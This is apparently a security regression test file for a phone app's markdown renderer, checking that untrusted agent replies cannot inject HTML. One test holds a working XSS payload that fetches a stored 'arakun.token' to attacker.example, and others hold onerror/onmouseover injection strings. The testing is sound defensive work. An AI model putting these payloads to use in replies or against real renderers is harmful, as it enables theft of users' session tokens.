// The markdown phone/public/app.js draws agent replies with. Agent text is untrusted
// (a repository or a web page can steer it), so what comes out goes into
// innerHTML only as tags the renderer wrote itself. Run with
// `node --test phone/test/`.
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import vm from "node:vm";

const here = dirname(fileURLToPath(import.meta.url));
const app = readFileSync(join(here, "..", "public", "app.js"), "utf8");

// app.js runs only in a page, so the renderer is taken out of it whole: each
// piece from its first line to the closing brace at the start of a line.
function piece(start) {
  const from = app.indexOf(start);
  assert.notEqual(from, -1, `app.js has no ${start}`);
  const end = start.startsWith("const ") ? app.indexOf(";\n", from) + 2 : app.indexOf("\n}\n", from) + 3;
  return app.slice(from, end);
}
const source = ["const esc =", "function md(", "function inline(", "function picSrc(", "function picHtml("].map(piece).join("\n");
const page = { window: {}, relay: null, pics: new Map(), ICONS: { expand: "" } };
vm.runInNewContext(`${source}\nthis.md = md; this.inline = inline;`, page);
const { md, inline } = page;

const allowed = {
  a: ["href", "target", "rel"],
  img: ["src", "data-src", "alt", "class", "loading"],
};

/// Every tag in `html` is one the renderer writes, with only its own
/// attributes, each double-quoted and holding no tag. Anything else that would
/// reach the HTML parser as markup (a stray `<`, `>` or `"`) fails.
function assertSafe(html) {
  const tag = /<(\/?)([a-z][a-z0-9]*)((?:\s+[a-z-]+="[^"<>]*")*)\s*>/g;
  for (const [, close, name, attrs] of html.matchAll(tag)) {
    if (close) continue;
    const names = [...attrs.matchAll(/([a-z-]+)="/g)].map((m) => m[1]);
    for (const n of names) assert.ok((allowed[name] || ["class"]).includes(n), `<${name}> got ${n}= in ${html}`);
    if (name === "a") assert.match(attrs, /href="https?:\/\/[^"]*"/, `link without a web address in ${html}`);
  }
  const rest = html.replace(tag, "");
  assert.doesNotMatch(rest, /[<>"]/, `markup outside the renderer's tags: ${rest}`);
}

test("an image inside a link's address cannot break out of the link", () => {
  // GHSA-756p-frh7-w9cw: the image's HTML went back into the href, whose quote
  // it closed, so the link got an onpointerdown handler from the agent's text.
  const reply =
    '[Open the build log](https://example.com/![javascript:fetch("https://attacker.example/?t="+localStorage.getItem("arakun.token"))](/onpointerdown=location=this.attributes.alt.value//))';
  const html = md(reply);
  assertSafe(html);
  assert.doesNotMatch(html, /<a /);
  assert.match(html, /<img src="\/onpointerdown=location=this\.attributes\.alt\.value\/\/" alt="javascript:fetch\(&quot;/);
});

test("code inside a link's address stays out of the href", () => {
  const html = inline("[log](https://example.com/`x`)");
  assertSafe(html);
  assert.doesNotMatch(html, /<a /);
  assert.match(html, /<code>x<\/code>/);
});

test("agent text cannot bring its own placeholders", () => {
  for (const forged of ["\u00010\u0001", "\u00009\u0000", "![a](/a.png) \u00010\u0001", "[x](https://e.com/\u00010\u0001)"]) {
    const html = inline(forged);
    assertSafe(html);
    assert.doesNotMatch(html, /undefined/);
    assert.ok((html.match(/<img /g) || []).length <= 1, html);
  }
});

test("links, images and code still render", () => {
  assert.equal(inline("[docs](https://arakun.dev/a?b=1&c=2)"), '<a href="https://arakun.dev/a?b=1&amp;c=2" target="_blank" rel="noopener">docs</a>');
  assert.equal(inline("![plot](/image/p.png?sig=a&t=1)"), '<img src="/image/p.png?sig=a&amp;t=1" alt="plot" class="pic" loading="lazy">');
  assert.equal(inline("run `a < b` now"), "run <code>a &lt; b</code> now");
  // A picture as the text of a link is still a picture in a link.
  const linked = inline("[![logo](https://arakun.dev/l.png)](https://arakun.dev/)");
  assertSafe(linked);
  assert.equal(linked, '<a href="https://arakun.dev/" target="_blank" rel="noopener"><img src="https://arakun.dev/l.png" alt="logo" class="pic" loading="lazy"></a>');
});

test("attribute quotes in agent text stay text", () => {
  for (const reply of [
    '[x](https://e.com/"onmouseover="alert(1))',
    "![x\" onerror=\"alert(1)](/a.png)",
    "![x](/a.png\"onerror=alert(1))",
    "**[x](https://e.com/**\"**)**",
    "<img src=x onerror=alert(1)>",
  ]) {
    assertSafe(md(reply));
  }
});
